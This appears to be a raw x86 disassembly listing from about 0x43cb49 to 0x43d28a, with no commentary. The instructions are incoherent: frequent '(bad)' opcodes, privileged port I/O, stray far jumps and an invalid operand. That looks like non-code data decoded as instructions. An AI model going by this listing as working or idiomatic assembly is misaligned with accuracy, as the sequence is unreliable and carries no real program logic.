  43cb49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cb4a:	pusha  
  43cb4b:	arpl   WORD PTR ds:0x3eb56139,bx
  43cb51:	inc    ebx
  43cb52:	push   ds
  43cb53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cb54:	inc    ebx
  43cb55:	sbb    al,0x43
  43cb57:	cmp    ebx,DWORD PTR [eax+0x53abbd56]
  43cb5d:	dec    edx
  43cb5e:	adc    al,0x24
  43cb60:	dec    eax
  43cb61:	sahf   
  43cb62:	ins    BYTE PTR es:[edi],dx
  43cb63:	pop    eax
  43cb64:	or     DWORD PTR ds:0x789ac5a,eax
  43cb6a:	out    0xe0,eax
  43cb6c:	cmp    DWORD PTR [ebx+0x5a],esi
  43cb6f:	ror    DWORD PTR [ecx],0x1
  43cb72:	adc    BYTE PTR [esi+eax*1-0x394a20fd],dh
  43cb79:	pushf  
  43cb7a:	mov    al,ds:0x1f81788a
  43cb7f:	movzx  ebp,ch
  43cb82:	push   ss
  43cb83:	mov    ds:0xd6bca79a,al
  43cb88:	xchg   ebx,eax
  43cb89:	int    0x1
  43cb8b:	jle    0x43cb72
  43cb8d:	je     0x43cbd1
  43cb8f:	cmc    
  43cb90:	push   esp
  43cb91:	xchg   BYTE PTR [eax+0x7f],ah
  43cb94:	scas   eax,DWORD PTR es:[edi]
  43cb95:	shl    BYTE PTR [ecx-0x2b],1
  43cb98:	push   esi
  43cb99:	push   esi
  43cb9a:	jge    0x43cb70
  43cb9c:	cmp    BYTE PTR [esi-0x132007c7],0xc4
  43cba3:	sar    dh,0xa5
  43cba6:	out    dx,eax
  43cba7:	adc    al,0x6d
  43cba9:	cmp    DWORD PTR ds:0x60031f7a,0xc22d3560
  43cbb3:	in     eax,dx
  43cbb4:	aam    0x45
  43cbb6:	jle    0x43cc34
  43cbb8:	mov    ecx,edi
  43cbba:	lock push ds
  43cbbc:	mov    dh,0x32
  43cbbe:	not    edi
  43cbc0:	out    0x2f,eax
  43cbc2:	in     al,0x58
  43cbc4:	add    edi,DWORD PTR [ebx+0x1f]
  43cbc7:	imul   ebx,DWORD PTR [edx-0x80],0x3b446c03
  43cbce:	xor    ecx,DWORD PTR [edi-0x416e5066]
  43cbd4:	pop    es
  43cbd5:	sbb    al,0x3
  43cbd7:	jp     0x43cb5e
  43cbd9:	aaa    
  43cbda:	lahf   
  43cbdb:	mov    ds,WORD PTR [edx+0x74]
  43cbde:	jle    0x43cb7a
  43cbe0:	and    cl,BYTE PTR [edx+0x6f]
  43cbe3:	push   esp
  43cbe4:	mov    esp,0x56068452
  43cbe9:	loop   0x43cc4b
  43cbeb:	sbb    edi,DWORD PTR [edi+0x453005c4]
  43cbf1:	popf   
  43cbf2:	adc    ecx,ecx
  43cbf4:	cli    
  43cbf5:	add    eax,0xd4550954
  43cbfa:	xchg   DWORD PTR [ebx],edx
  43cbfc:	rol    BYTE PTR [ecx],1
  43cbfe:	mov    ss,WORD PTR [ecx+ecx*4]
  43cc01:	mov    bh,0xd3
  43cc03:	fiadd  DWORD PTR [edx-0x7a]
  43cc06:	cmovg  ebp,DWORD PTR [edx]
  43cc09:	ret    0xaa0c
  43cc0c:	adc    al,0xdf
  43cc0e:	repz pushf 
  43cc10:	aam    0xa2
  43cc12:	(bad)  [ebp-0x46e1ad3f]
  43cc18:	retf   
  43cc19:	in     eax,dx
  43cc1a:	fwait
  43cc1b:	popf   
  43cc1c:	lock test al,0xeb
  43cc1f:	out    0x40,eax
  43cc21:	loope  0x43cbcd
  43cc23:	aad    0x2e
  43cc25:	mov    eax,0x20d3529f
  43cc2a:	ja     0x43cbfe
  43cc2c:	cld    
  43cc2d:	sub    DWORD PTR [ebp+edx*8+0x74eef0c4],ecx
  43cc34:	push   0x17
  43cc36:	int3   
  43cc37:	aam    0x44
  43cc39:	xchg   ecx,eax
  43cc3a:	or     al,0xd8
  43cc3c:	pop    ecx
  43cc3d:	loopne 0x43cc56
  43cc3f:	ins    BYTE PTR es:[edi],dx
  43cc40:	jl     0x43cbcf
  43cc42:	dec    ebp
  43cc43:	sbb    eax,0x2d6ded42
  43cc48:	push   ds
  43cc49:	std    
  43cc4a:	jg     0x43cc9d
  43cc4c:	lods   al,BYTE PTR ds:[esi]
  43cc4d:	cdq    
  43cc4e:	mov    ah,0xd3
  43cc50:	scas   al,BYTE PTR es:[edi]
  43cc51:	and    ecx,0x30bdc0a8
  43cc57:	mov    esi,DWORD PTR [ebx+0x3d]
  43cc5a:	adc    eax,0x1f65447a
  43cc5f:	and    DWORD PTR [ebx],edx
  43cc61:	aas    
  43cc62:	call   0x378e58e7
  43cc67:	aam    0x75
  43cc69:	xchg   esi,eax
  43cc6a:	mov    ?,ebx
  43cc6c:	dec    eax
  43cc6d:	xchg   edi,eax
  43cc6e:	pop    ecx
  43cc6f:	imul   eax,DWORD PTR [edi-0x4a1859d9],0xfffffff9
  43cc76:	pop    edi
  43cc77:	ss adc si,cx
  43cc7b:	aam    0xfa
  43cc7d:	mov    DWORD PTR [eax],edi
  43cc7f:	ret    
  43cc80:	cmp    edi,DWORD PTR [esi+eax*8-0x70cc77bf]
  43cc87:	scas   al,BYTE PTR es:[edi]
  43cc88:	in     eax,dx
  43cc89:	and    DWORD PTR [esi+0x5c],eax
  43cc8c:	add    ah,BYTE PTR [esi+edi*4]
  43cc8f:	into   
  43cc90:	add    dh,BYTE PTR [edi+0x415d6b20]
  43cc96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cc97:	jne    0x43cc2f
  43cc99:	out    dx,eax
  43cc9a:	mov    ah,0xb2
  43cc9c:	add    BYTE PTR [edx],al
  43cc9e:	or     dh,BYTE PTR [esi]
  43cca0:	(bad)  
  43cca1:	sbb    al,0xa9
  43cca3:	aad    0x24
  43cca5:	out    0xb,al
  43cca7:	or     DWORD PTR [eax-0x61],edi
  43ccaa:	gs dec edi
  43ccac:	mov    BYTE PTR [ecx-0x1c38952e],ch
  43ccb2:	loopne 0x43ccd4
  43ccb4:	add    al,BYTE PTR [edx]
  43ccb6:	into   
  43ccb7:	inc    ebx
  43ccb8:	iret   
  43ccb9:	movq   mm3,mm0
  43ccbc:	xor    BYTE PTR cs:[edi],bl
  43ccbf:	fild   QWORD PTR [eax-0x1fad78c3]
  43ccc5:	inc    ecx
  43ccc6:	dec    eax
  43ccc7:	aam    0x56
  43ccc9:	imul   eax,DWORD PTR [ebx-0x51307d2d],0xffffff9b
  43ccd0:	bound  esp,QWORD PTR [eax+0x7f8cf360]
  43ccd6:	(bad)  
  43ccd7:	mov    ds:0xd4650fa6,eax
  43ccdc:	push   cs
  43ccdd:	in     eax,0x9a
  43ccdf:	popf   
  43cce0:	leave  
  43cce1:	push   cs
  43cce2:	push   ds
  43cce3:	cmp    eax,0xd3a2b588
  43cce8:	cwde   
  43cce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ccea:	sub    eax,0xe005c94b
  43ccef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ccf0:	aad    0xaf
  43ccf2:	xor    dl,BYTE PTR [esi-0x7083b3f3]
  43ccf8:	cli    
  43ccf9:	arpl   WORD PTR [eax-0x6e2b2d2c],ax
  43ccff:	bound  esi,QWORD PTR [edx]
  43cd01:	add    edi,DWORD PTR [esi]
  43cd03:	leave  
  43cd04:	jnp    0x43cd07
  43cd06:	or     al,0xc3
  43cd08:	cld    
  43cd09:	out    0x3c,al
  43cd0b:	sbb    eax,0x1bc0da7b
  43cd10:	jecxz  0x43cd66
  43cd12:	pop    ds
  43cd13:	shr    esp,cl
  43cd15:	popf   
  43cd16:	cmp    esp,esi
  43cd18:	and    al,0x89
  43cd1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cd1b:	aad    0x70
  43cd1d:	fist   WORD PTR [edx]
  43cd1f:	test   al,0x94
  43cd21:	mov    DWORD PTR [ecx],ecx
  43cd23:	aas    
  43cd24:	mov    DWORD PTR [ecx-0x71b27f9a],edx
  43cd2a:	inc    edx
  43cd2b:	mov    bl,0x3c
  43cd2d:	test   BYTE PTR [ebp-0x71],dl
  43cd30:	(bad)  
  43cd31:	repz stc 
  43cd33:	aam    0xcf
  43cd35:	mov    eax,0x83fd890d
  43cd3a:	pusha  
  43cd3b:	popa   
  43cd3c:	push   es
  43cd3d:	jnp    0x43cd0f
  43cd3f:	sub    BYTE PTR [esi],bl
  43cd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cd42:	loope  0x43cd19
  43cd44:	push   eax
  43cd45:	out    0x7f,al
  43cd47:	ins    DWORD PTR es:[edi],dx
  43cd48:	sub    bl,BYTE PTR [ebp+0x2d]
  43cd4b:	fmul   DWORD PTR [ecx-0x55d165c3]
  43cd51:	mov    ecx,ss
  43cd53:	sbb    al,0xa2
  43cd55:	push   es
  43cd56:	push   ebp
  43cd57:	test   al,0x98
  43cd59:	xchg   esi,eax
  43cd5a:	in     eax,0x4d
  43cd5c:	inc    esp
  43cd5d:	cli    
  43cd5e:	xchg   ebp,eax
  43cd5f:	(bad)  
  43cd61:	add    ch,BYTE PTR [edi-0x53]
  43cd64:	cmc    
  43cd65:	sar    DWORD PTR [ecx+0x5400667b],0xde
  43cd6c:	mov    bl,BYTE PTR [ebx-0x1ee3b97d]
  43cd72:	xchg   edi,eax
  43cd73:	add    eax,0x8f77786d
  43cd78:	fs dec edx
  43cd7a:	rol    DWORD PTR [eax],1
  43cd7c:	xor    dl,bh
  43cd7e:	loopne 0x43cd55
  43cd80:	into   
  43cd81:	shl    BYTE PTR [ebx+eax*8],0xc8
  43cd85:	cmc    
  43cd86:	jle    0x43cd37
  43cd88:	mov    ah,BYTE PTR [ecx-0x13b3257f]
  43cd8e:	rcl    BYTE PTR [ebx+0x30],cl
  43cd91:	cmp    DWORD PTR [edi-0x2c],ebx
  43cd94:	test   al,0xf7
  43cd96:	dec    esp
  43cd97:	jmp    0x43ce08
  43cd99:	push   ds
  43cd9a:	fistp  QWORD PTR [ebx-0x77]
  43cd9d:	push   edi
  43cd9e:	pop    ebp
  43cd9f:	int    0xbc
  43cda1:	sub    DWORD PTR [eax+eiz*2-0x3617fd0f],ebx
  43cda8:	mov    bl,0xbc
  43cdaa:	loop   0x43cdaf
  43cdac:	mov    ds:0x57011f5c,eax
  43cdb1:	mov    eax,ds:0xf93ef916
  43cdb6:	dec    esp
  43cdb7:	rcl    DWORD PTR [eax+0x48],cl
  43cdba:	pusha  
  43cdbb:	cld    
  43cdbc:	sti    
  43cdbd:	rol    BYTE PTR [eax],cl
  43cdbf:	push   edi
  43cdc0:	jns    0x43ce3c
  43cdc2:	nop
  43cdc3:	pop    ds
  43cdc4:	(bad)  
  43cdc5:	and    DWORD PTR [esi],ebp
  43cdc7:	lock xchg ebp,eax
  43cdc9:	stc    
  43cdca:	into   
  43cdcb:	push   0x7f
  43cdcd:	pop    eax
  43cdce:	aas    
  43cdcf:	mov    ds:0xba88f110,al
  43cdd4:	outs   dx,DWORD PTR ds:[esi]
  43cdd5:	gs or  dh,al
  43cdd8:	push   edi
  43cdd9:	jmp    0x43ce00
  43cddb:	lods   eax,DWORD PTR ds:[esi]
  43cddc:	push   ebx
  43cddd:	xor    DWORD PTR [edi-0x64b79fc8],ebp
  43cde3:	jne    0x43ce01
  43cde5:	add    ch,BYTE PTR [ebp-0x56798ec2]
  43cdeb:	push   eax
  43cdec:	sub    al,BYTE PTR [edx]
  43cdee:	neg    BYTE PTR [edi+0xd]
  43cdf1:	cmp    ch,BYTE PTR [bx+0x40]
  43cdf5:	shl    DWORD PTR [eax+0x67],0xce
  43cdf9:	xchg   edi,eax
  43cdfa:	adc    BYTE PTR [ecx-0x2a7538d8],0x7d
  43ce01:	inc    ecx
  43ce02:	outs   dx,BYTE PTR ds:[esi]
  43ce03:	or     al,0x11
  43ce05:	(bad)  
  43ce06:	sbb    eax,0x1e01652f
  43ce0b:	dec    ecx
  43ce0c:	iret   
  43ce0d:	or     DWORD PTR [ebx+0x60a9b829],esp
  43ce13:	aam    0x86
  43ce15:	lods   al,BYTE PTR ds:[esi]
  43ce17:	jns    0x43ce95
  43ce19:	cs dec eax
  43ce1b:	add    DWORD PTR [eax+0x67e03e43],ecx
  43ce21:	inc    esi
  43ce22:	call   0xe4a1b12a
  43ce27:	mov    edi,0x68303b10
  43ce2c:	mov    ebx,esi
  43ce2e:	pusha  
  43ce2f:	or     bl,dh
  43ce31:	lahf   
  43ce32:	sahf   
  43ce33:	js     0x43cdc4
  43ce35:	dec    ecx
  43ce36:	mov    ds:0xc7d95e2e,eax
  43ce3b:	sti    
  43ce3c:	call   0x52f0c55e
  43ce41:	add    ebp,DWORD PTR [esi-0x4]
  43ce44:	outs   dx,DWORD PTR ds:[esi]
  43ce45:	xor    DWORD PTR es:[ebp+0x66],edi
  43ce49:	jp     0x43ce6a
  43ce4b:	ins    DWORD PTR es:[edi],dx
  43ce4c:	pop    ebp
  43ce4d:	xchg   BYTE PTR [esp+eax*8],bl
  43ce50:	sahf   
  43ce51:	loopne 0x43ce32
  43ce53:	call   0x21ffd19f
  43ce58:	sbb    ah,BYTE PTR [edi]
  43ce5a:	test   eax,0x1fd57b4c
  43ce5f:	loope  0x43ce60
  43ce61:	jns    0x43ce68
  43ce63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ce64:	sub    ch,BYTE PTR es:[edx-0x6508fc51]
  43ce6b:	jbe    0x43ceae
  43ce6d:	sub    al,0xf2
  43ce6f:	sbb    al,0x89
  43ce71:	ret    
  43ce72:	sub    al,0x75
  43ce74:	adc    al,0x6
  43ce76:	pop    ds
  43ce77:	push   ecx
  43ce78:	repnz ror ebp,1
  43ce7b:	daa    
  43ce7c:	outs   dx,BYTE PTR ds:[esi]
  43ce7d:	and    ah,dh
  43ce7f:	aad    0x9f
  43ce81:	(bad)  
  43ce82:	sbb    eax,0xbb087ce7
  43ce87:	mov    DWORD PTR cs:[ebx],esp
  43ce8a:	add    DWORD PTR [esi+edx*8+0x3c],ebp
  43ce8e:	fmul   DWORD PTR [ebp-0x32]
  43ce91:	mov    al,al
  43ce93:	adc    DWORD PTR [esi-0x26],edi
  43ce96:	pusha  
  43ce97:	cmp    ebx,ebp
  43ce99:	fistp  WORD PTR [esi]
  43ce9b:	and    al,0x0
  43ce9d:	enter  0xd578,0xa8
  43cea1:	ret    0xb740
  43cea4:	mov    ds:0xf5a5eed2,al
  43cea9:	mov    eax,ds:0x8acdd713
  43ceae:	inc    ebx
  43ceaf:	pushf  
  43ceb0:	pop    edx
  43ceb1:	push   ecx
  43ceb2:	push   es
  43ceb3:	aam    0x43
  43ceb5:	jmp    0x7e428357
  43ceba:	sub    eax,0x814f8886
  43cebf:	pop    ecx
  43cec0:	rcr    BYTE PTR [eax+0x6f],1
  43cec3:	xor    eax,0x100402d4
  43cec8:	test   al,0xb1
  43ceca:	jo     0x43ced0
  43cecc:	sbb    al,0xba
  43cece:	pusha  
  43cecf:	test   eax,0xfa88aa66
  43ced4:	ret    0x1bdb
  43ced7:	(bad)  
  43ced8:	out    0x2,al
  43ceda:	out    0x99,al
  43cedc:	xor    DWORD PTR [ecx-0x60],ecx
  43cedf:	pop    edx
  43cee0:	xchg   edi,eax
  43cee1:	inc    esp
  43cee2:	push   ds
  43cee3:	or     edi,edx
  43cee5:	dec    esi
  43cee6:	in     al,dx
  43cee7:	mov    al,ds:0xd5c6195c
  43ceec:	push   eax
  43ceed:	xchg   edx,eax
  43ceee:	mov    eax,ds:0x25d12c13
  43cef3:	hlt    
  43cef4:	mov    esi,ebp
  43cef6:	push   ecx
  43cef7:	mov    ds:0x8b3d1925,al
  43cefc:	dec    eax
  43cefd:	inc    eax
  43cefe:	mov    ds:0xb792b0d5,al
  43cf03:	pop    ss
  43cf04:	ss aas 
  43cf06:	pop    esi
  43cf07:	and    BYTE PTR [ecx-0x46a7c343],cl
  43cf0d:	in     al,0x71
  43cf0f:	pop    edi
  43cf10:	pop    ebx
  43cf11:	push   edi
  43cf12:	pop    esp
  43cf13:	add    dh,BYTE PTR [edx-0x4b7155fe]
  43cf19:	aas    
  43cf1a:	pop    esi
  43cf1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cf1c:	mov    DWORD PTR [ebp-0x32],esi
  43cf1f:	in     al,dx
  43cf20:	fstp   QWORD PTR [ecx-0x20fc74f]
  43cf26:	mov    eax,ds:0xf0430dd4
  43cf2b:	mov    DWORD PTR [edx],edi
  43cf2d:	dec    esp
  43cf2e:	or     DWORD PTR [edi-0x77],edi
  43cf31:	mov    eax,ds:0x20fbbb5c
  43cf36:	cmp    DWORD PTR [edi-0x1a67fd11],ebp
  43cf3c:	xlat   BYTE PTR ds:[ebx]
  43cf3d:	sahf   
  43cf3e:	jmp    0x8948:0x1a0ababd
  43cf45:	test   eax,0xc54db9ec
  43cf4a:	add    al,0xae
  43cf4c:	sbb    BYTE PTR [edx],al
  43cf4e:	lock je 0x43cf29
  43cf51:	cmc    
  43cf52:	pop    eax
  43cf53:	iret   
  43cf54:	and    eax,esp
  43cf56:	pusha  
  43cf57:	ret    
  43cf58:	mov    BYTE PTR [edx],cl
  43cf5a:	test   al,0x52
  43cf5c:	clc    
  43cf5d:	out    dx,eax
  43cf5e:	mov    ch,dl
  43cf60:	mov    cl,0x84
  43cf62:	daa    
  43cf63:	rcr    BYTE PTR [eax],1
  43cf65:	push   cs
  43cf66:	jo     0x43cfa6
  43cf68:	mov    DWORD PTR ds:0x5c62a99e,edi
  43cf6e:	fs ror eax,1
  43cf71:	add    bl,al
  43cf73:	jg     0x43cf75
  43cf75:	mov    ecx,0xf042efd
  43cf7a:	pop    edx
  43cf7b:	jge    0x43cf27
  43cf7d:	arpl   WORD PTR [edi],di
  43cf7f:	cmp    BYTE PTR [eax],dl
  43cf81:	test   al,0x34
  43cf83:	mov    edi,0x738b7429
  43cf88:	in     al,dx
  43cf89:	bound  ebx,QWORD PTR [edi]
  43cf8b:	outs   dx,DWORD PTR ds:[esi]
  43cf8c:	loop   0x43cf80
  43cf8e:	inc    edx
  43cf8f:	mov    esi,0xd736612a
  43cf94:	and    ebx,DWORD PTR ds:0xb4c5be06
  43cf9a:	mov    ebx,0x63a98f14
  43cf9f:	dec    esi
  43cfa0:	jp     0x43cfc3
  43cfa2:	stc    
  43cfa3:	lds    ebp,FWORD PTR [edx+0x4d]
  43cfa6:	cwde   
  43cfa7:	mov    ecx,0xd6463916
  43cfac:	mov    DWORD PTR [ecx+0x1fb11a1a],ecx
  43cfb2:	push   ds
  43cfb3:	sbb    DWORD PTR [eax],0xa110b58
  43cfb9:	enter  0xd0e8,0x1e
  43cfbd:	jl     0x43cfac
  43cfbf:	adc    al,0x44
  43cfc1:	sti    
  43cfc2:	lahf   
  43cfc3:	xor    dh,BYTE PTR [edi+eiz*2+0x6c2dc11f]
  43cfca:	stos   BYTE PTR es:[edi],al
  43cfcb:	push   cs
  43cfcc:	fisub  DWORD PTR [ebp-0x7a362a49]
  43cfd2:	je     0x43cf80
  43cfd4:	retf   
  43cfd5:	daa    
  43cfd6:	dec    edi
  43cfd7:	fstp   QWORD PTR [edi+eax*8+0x1f]
  43cfdb:	inc    edi
  43cfdc:	aas    
  43cfdd:	repz push ebx
  43cfdf:	add    dl,BYTE PTR [esi+0x11]
  43cfe2:	adc    ah,0x25
  43cfe5:	push   esp
  43cfe6:	jne    0x43cf7e
  43cfe8:	xor    DWORD PTR ds:0x15c04df3,0x3896895
  43cff2:	jmp    0x8cd5:0x481b9c58
  43cff9:	cs jno 0x43cfb2
  43cffc:	test   BYTE PTR [ecx+0x1f896acc],ah
  43d002:	aam    0x70
  43d004:	pop    eax
  43d005:	test   DWORD PTR ds:0xe22611f8,ebp
  43d00b:	cdq    
  43d00c:	and    esp,DWORD PTR [edx-0x22]
  43d00f:	and    eax,0xa6c96931
  43d014:	mov    ah,BYTE PTR [ecx-0x74]
  43d017:	xor    al,0x49
  43d019:	dec    esp
  43d01a:	cmp    dl,BYTE PTR [ebx-0x2b567c18]
  43d020:	mov    cl,0x33
  43d022:	or     ecx,DWORD PTR [eax+0x3d4ac979]
  43d028:	push   edx
  43d029:	ret    
  43d02a:	inc    esp
  43d02b:	cmp    BYTE PTR [esi+0x4fc8c6d3],al
  43d031:	pop    esi
  43d032:	mov    esi,0xafbcfa21
  43d037:	hlt    
  43d038:	mov    eax,DWORD PTR [edx]
  43d03a:	test   BYTE PTR [edx-0x70251bae],al
  43d040:	cdq    
  43d041:	mov    dh,0x61
  43d043:	sbb    eax,DWORD PTR [ebx-0x600fafc2]
  43d049:	inc    ebp
  43d04a:	xlat   BYTE PTR ds:[ebx]
  43d04b:	xchg   esi,eax
  43d04c:	or     edx,DWORD PTR ds:0x49af5bee
  43d052:	xchg   DWORD PTR [edi+0x30],eax
  43d055:	jle    0x43d076
  43d057:	leave  
  43d058:	inc    edi
  43d059:	call   0x9ec0:0x5dea465
  43d060:	mov    dh,0xce
  43d062:	sbb    DWORD PTR fs:[ebp+esi*2+0x1f],esi
  43d067:	mov    eax,ds:0xca822420
  43d06c:	std    
  43d06d:	sbb    BYTE PTR [ebx-0x3ffa3328],cl
  43d073:	xor    al,0x9a
  43d075:	adc    DWORD PTR [ecx+0x571ea568],0x60975d07
  43d07f:	aaa    
  43d080:	xchg   esp,eax
  43d081:	inc    esp
  43d082:	mov    ah,0xfa
  43d084:	cmp    al,BYTE PTR [ebx]
  43d086:	sub    BYTE PTR [eax],cl
  43d088:	aaa    
  43d089:	popa   
  43d08a:	sbb    dh,BYTE PTR [ecx+0x291fc4b9]
  43d090:	jae    0x43d061
  43d092:	dec    eax
  43d093:	jb     0x43d095
  43d095:	pmovmskb edx,mm4
  43d098:	daa    
  43d099:	pop    edi
  43d09a:	add    BYTE PTR [edx-0x6f],0x9e
  43d09e:	push   edi
  43d09f:	call   0x9bb7:0xfa32a788
  43d0a6:	push   es
  43d0a7:	xor    al,0x58
  43d0a9:	add    eax,DWORD PTR [esi-0x74a6b793]
  43d0af:	addr16 retfw 
  43d0b2:	bound  ebx,QWORD PTR [edi-0xb038fdd]
  43d0b8:	xchg   BYTE PTR [ebp-0x55eac0d8],ah
  43d0be:	aaa    
  43d0bf:	mov    bh,0x88
  43d0c1:	cmp    edi,DWORD PTR [esp+ebx*8-0x728f3b61]
  43d0c8:	xchg   ebp,eax
  43d0c9:	add    ebp,DWORD PTR [edi-0x32bdee76]
  43d0cf:	add    al,0x9
  43d0d1:	sahf   
  43d0d2:	push   ds
  43d0d3:	int    0xec
  43d0d5:	fsub   DWORD PTR [eax]
  43d0d7:	scas   al,BYTE PTR es:[edi]
  43d0d8:	and    al,0x2
  43d0da:	mov    ds:0x583ea253,al
  43d0df:	outs   dx,DWORD PTR ds:[esi]
  43d0e0:	rcr    ch,cl
  43d0e2:	pusha  
  43d0e3:	dec    edi
  43d0e4:	imul   eax,DWORD PTR [edx+0x6e9d6409],0x71
  43d0eb:	jge    0x43d09f
  43d0ed:	and    al,0x75
  43d0ef:	(bad)  
  43d0f0:	pop    ds
  43d0f1:	pop    ebp
  43d0f2:	pop    edi
  43d0f3:	xor    al,0x53
  43d0f5:	xchg   ebx,eax
  43d0f6:	mov    WORD PTR [esi],?
  43d0f8:	mov    DWORD PTR [edi-0x57197d10],ebx
  43d0fe:	adc    al,0x6a
  43d100:	cmp    eax,DWORD PTR [edx]
  43d102:	outs   dx,BYTE PTR ds:[esi]
  43d103:	mov    ds:0x48bb3169,eax
  43d108:	pop    esi
  43d109:	xor    al,0x7d
  43d10b:	cmp    eax,0x55bfeaa5
  43d110:	ret    0xa459
  43d113:	(bad)  
  43d114:	fadd   QWORD PTR ds:0xfdf15bfc
  43d11a:	push   esp
  43d11b:	push   ss
  43d11c:	sbb    BYTE PTR [ecx+0x3b],dh
  43d11f:	test   eax,0xacfc3388
  43d124:	ret    0xdbff
  43d127:	in     al,dx
  43d128:	lods   eax,DWORD PTR ds:[esi]
  43d129:	add    bl,ah
  43d12b:	cmp    al,0xd5
  43d12d:	xchg   BYTE PTR [ebx+esi*2-0xabc645c],dl
  43d134:	mov    eax,ds:0x47c91e7a
  43d139:	pop    ds
  43d13a:	adc    esp,ebp
  43d13c:	int    0x17
  43d13e:	mov    BYTE PTR [edi],dh
  43d140:	cvtpi2ps xmm7,mm3
  43d143:	je     0x43d191
  43d145:	ins    DWORD PTR es:[edi],dx
  43d146:	aam    0x27
  43d148:	hlt    
  43d149:	stc    
  43d14a:	mov    es,WORD PTR ds:0x9e841edc
  43d150:	repz xor BYTE PTR [edx+0x15],al
  43d154:	retw   
  43d156:	fcom   st(6)
  43d158:	push   esp
  43d159:	mov    dl,0x7d
  43d15b:	mov    ah,0x4a
  43d15d:	push   ebx
  43d15e:	jbe    0x43d19c
  43d160:	lds    eax,FWORD PTR [edi-0x16c636a6]
  43d166:	loopne 0x43d1d9
  43d168:	loopne 0x43d1b8
  43d16a:	jno    0x43d1ba
  43d16c:	xor    al,0x84
  43d16e:	jge    0x43d1a6
  43d170:	mov    BYTE PTR [edi],bh
  43d172:	xchg   BYTE PTR [ecx],dh
  43d174:	xor    ah,BYTE PTR [edi-0x4d]
  43d177:	test   BYTE PTR [ecx+0x7483f2f5],0x64
  43d17e:	pusha  
  43d17f:	xor    ebx,DWORD PTR [edi]
  43d181:	add    cl,BYTE PTR [ecx+eiz*8-0x64]
  43d185:	hlt    
  43d186:	gs nop
  43d188:	pop    esp
  43d189:	iret   
  43d18a:	pop    ds
  43d18b:	mov    ds:0x6125210,eax
  43d190:	jl     0x43d15f
  43d192:	not    esp
  43d194:	mov    al,0xb2
  43d196:	bound  eax,QWORD PTR [ecx-0x465c71a9]
  43d19c:	mov    ebx,ebx
  43d19e:	cs nop
  43d1a0:	repz or al,0xfb
  43d1a3:	mov    ds,esp
  43d1a5:	push   ds
  43d1a6:	xor    BYTE PTR [edx],cl
  43d1a8:	dec    ebp
  43d1a9:	(bad)  
  43d1aa:	fadd   DWORD PTR [ebp+0x9]
  43d1ad:	out    0x96,al
  43d1af:	add    BYTE PTR [ecx+0x4f5a447],cl
  43d1b5:	nop
  43d1b6:	xchg   edi,eax
  43d1b7:	jmp    0x764bd795
  43d1bc:	das    
  43d1bd:	jnp    0x43d196
  43d1bf:	stc    
  43d1c0:	xchg   ebx,eax
  43d1c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d1c2:	gs out 0xc7,eax
  43d1c5:	jge    0x43d187
  43d1c7:	(bad)  
  43d1c8:	ja     0x43d1df
  43d1ca:	retf   0x40f4
  43d1cd:	fwait
  43d1ce:	mov    al,ds:0x6ea59b75
  43d1d3:	xchg   esp,eax
  43d1d4:	sbb    dl,bl
  43d1d6:	cmp    esp,edx
  43d1d8:	push   esp
  43d1d9:	cld    
  43d1da:	mov    DWORD PTR [ebx-0x1c],ebp
  43d1dd:	cdq    
  43d1de:	jbe    0x43d1b6
  43d1e0:	jne    0x43d166
  43d1e2:	clts   
  43d1e4:	imul   edx,DWORD PTR [eax],0xffffff85
  43d1e7:	hlt    
  43d1e8:	ins    BYTE PTR es:[edi],dx
  43d1e9:	and    ah,BYTE PTR [eax+0x4f]
  43d1ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d1ed:	je     0x43d1c3
  43d1ef:	jp     0x43d259
  43d1f1:	jle    0x43d232
  43d1f3:	nop
  43d1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d1f5:	add    eax,0x868bbd6c
  43d1fa:	sub    esi,eax
  43d1fc:	xlat   BYTE PTR ds:[ebx]
  43d1fd:	test   DWORD PTR [edi],ebx
  43d1ff:	imul   edi,ecx,0xb2615cfe
  43d205:	cmovns edx,esp
  43d208:	push   0x63
  43d20a:	mov    eax,ds:0x8c1540a4
  43d20f:	xor    cl,0xa3
  43d212:	xor    eax,edx
  43d214:	add    bh,bh
  43d216:	shl    DWORD PTR [esi],1
  43d218:	or     al,BYTE PTR [edx+0x28329b3]
  43d21e:	out    0x41,al
  43d220:	mov    ch,0x92
  43d222:	adc    BYTE PTR [ecx],0x12
  43d225:	pop    ds
  43d226:	pusha  
  43d227:	ja     0x43d23f
  43d229:	inc    ecx
  43d22a:	daa    
  43d22b:	dec    ebx
  43d22c:	into   
  43d22d:	add    al,0x28
  43d22f:	add    eax,0xc5d44b3c
  43d234:	add    DWORD PTR [edx],0x20
  43d237:	outs   dx,DWORD PTR ds:[esi]
  43d238:	ins    DWORD PTR es:[edi],dx
  43d239:	fidiv  DWORD PTR [edi]
  43d23b:	arpl   WORD PTR [eax-0x7bf5eb5],cx
  43d241:	and    al,BYTE PTR [edi]
  43d243:	lds    ebp,FWORD PTR [ebp+eax*1+0x57746bec]
  43d24a:	push   0x52
  43d24c:	sbb    BYTE PTR [edx-0x13a3f89e],dh
  43d252:	xor    ch,cl
  43d254:	adc    dh,dl
  43d256:	lahf   
  43d257:	add    edi,DWORD PTR [edi+edi*8+0x6a0bd449]
  43d25e:	sbb    BYTE PTR [ebx+ebx*1],0x67
  43d262:	outs   dx,DWORD PTR ds:[esi]
  43d263:	sub    DWORD PTR [ecx-0x5ea255bd],ecx
  43d269:	jb     0x43d274
  43d26b:	es dec esi
  43d26d:	test   edx,0xed9a71d6
  43d273:	test   BYTE PTR [eax+eiz*4-0x1d],dl
  43d277:	xor    eax,0x9e090f8c
  43d27c:	mov    DWORD PTR [ecx],ecx
  43d27e:	ret    
  43d27f:	and    al,0xad
  43d281:	mov    eax,ds:0x6dd1983f
  43d286:	lods   al,BYTE PTR ds:[esi]
  43d287:	sti    
  43d288:	sub    al,0x15
  43d28a:	stos   BYTE PTR es:[edi],al
